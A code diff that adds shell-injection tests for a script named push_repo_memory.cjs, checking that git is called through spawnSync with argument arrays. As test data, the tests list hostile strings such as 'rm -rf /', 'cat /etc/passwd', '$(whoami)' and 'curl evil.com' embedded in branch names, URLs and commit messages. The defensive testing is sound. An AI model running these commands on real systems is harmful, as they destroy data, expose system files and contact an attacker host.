@@ -995,3 +995,121 @@ describe("push_repo_memory.cjs - glob pattern security tests", () => {
     });
   });
 });
+
+describe("push_repo_memory.cjs - shell injection security tests", () => {
+  describe("safe git command execution", () => {
+    it("should use spawnSync with args array instead of execSync with template strings", () => {
+      // This test verifies the security fix for shell injection vulnerability
+      // The file should use spawnSync with command-args array, not execSync with string interpolation
+
+      const fs = require("fs");
+      const path = require("path");
+
+      const scriptPath = path.join(import.meta.dirname, "push_repo_memory.cjs");
+      const scriptContent = fs.readFileSync(scriptPath, "utf8");
+
+      // Should import spawnSync, not execSync
+      expect(scriptContent).toContain('const { spawnSync } = require("child_process")');
+      expect(scriptContent).not.toContain('const { execSync } = require("child_process")');
+
+      // Should have execGitSync helper function
+      expect(scriptContent).toContain("function execGitSync(args, options = {})");
+      expect(scriptContent).toContain('spawnSync("git", args,');
+    });
+
+    it("should safely handle malicious branch names", () => {
+      // Test that malicious branch names would be rejected by git, not executed as shell commands
+      const maliciousBranchNames = [
+        "feature; rm -rf /", // Command chaining
+        "feature && echo hacked", // Conditional execution
+        "feature | cat /etc/passwd", // Pipe redirection
+        "feature$(whoami)", // Command substitution
+        "feature`whoami`", // Backtick substitution
+        "feature\nrm -rf /", // Newline injection
+        'feature"; curl evil.com', // Quote breaking
+      ];
+
+      // With spawnSync and args array, these would be treated as literal branch names
+      // Git would reject them as invalid branch names rather than executing them
+      for (const branchName of maliciousBranchNames) {
+        // Simulate the safe approach using spawnSync
+        const { spawnSync } = require("child_process");
+        const result = spawnSync("git", ["checkout", branchName], {
+          encoding: "utf8",
+          stdio: "pipe",
+        });
+
+        // Command should fail (non-zero exit code) because branch doesn't exist
+        // Important: It should NOT execute the injected command
+        expect(result.status).not.toBe(0);
+        expect(result.error || result.stderr).toBeTruthy();
+      }
+    });
+
+    it("should safely handle malicious repo URLs", () => {
+      // Test that malicious repo URLs would be treated as literals
+      const maliciousUrls = ["https://github.com/user/repo.git; rm -rf /", "https://github.com/user/repo.git && echo hacked", "https://github.com/user/repo.git | curl evil.com"];
+
+      // With spawnSync and args array, special characters are treated as part of the URL
+      // Git would fail to fetch from the malformed URL
+      for (const repoUrl of maliciousUrls) {
+        const { spawnSync } = require("child_process");
+        const result = spawnSync("git", ["fetch", repoUrl, "main:main"], {
+          encoding: "utf8",
+          stdio: "pipe",
+          timeout: 1000, // Quick timeout since we expect failure
+        });
+
+        // Command should fail because URL is invalid
+        // Important: The injected command should NOT execute
+        expect(result.status).not.toBe(0);
+      }
+    });
+
+    it("should safely handle malicious commit messages", () => {
+      // Test that malicious commit messages would be treated as literals
+      const maliciousMessages = ["Update; rm -rf /", "Update && curl evil.com", "Update\nmalicious command", 'Update"; echo hacked'];
+
+      // With spawnSync and args array, these would be literal commit messages
+      // No shell interpretation occurs
+      for (const message of maliciousMessages) {
+        const { spawnSync } = require("child_process");
+        // Note: This would fail in actual use because there are no staged changes
+        // But it demonstrates that special characters are treated literally
+        const result = spawnSync("git", ["commit", "-m", message], {
+          encoding: "utf8",
+          stdio: "pipe",
+        });
+
+        // The command would fail (no staged changes), but importantly:
+        // The malicious part of the message should NOT be executed
+        // Special characters like ; && | should be part of the commit message, not shell operators
+        expect(result.status).not.toBe(0);
+      }
+    });
+
+    it("should verify no vulnerable execSync patterns remain", () => {
+      // Ensure no vulnerable patterns like execSync(`git ${variable}`) exist
+      const fs = require("fs");
+      const path = require("path");
+
+      const scriptPath = path.join(import.meta.dirname, "push_repo_memory.cjs");
+      const scriptContent = fs.readFileSync(scriptPath, "utf8");
+
+      // Should not have vulnerable patterns with template literals
+      // These patterns would indicate shell injection vulnerabilities:
+      const vulnerablePatterns = [
+        /execSync\s*\(\s*`git.*\${/, // execSync(`git ... ${variable}`)
+        /execSync\s*\(\s*"git.*\${/, // execSync("git ... ${variable}")
+        /execSync\s*\(\s*'git.*\${/, // execSync('git ... ${variable}')
+      ];
+
+      for (const pattern of vulnerablePatterns) {
+        expect(scriptContent).not.toMatch(pattern);
+      }
+
+      // Should use safe execGitSync with args array
+      expect(scriptContent).toContain("execGitSync([");
+    });
+  });
+});
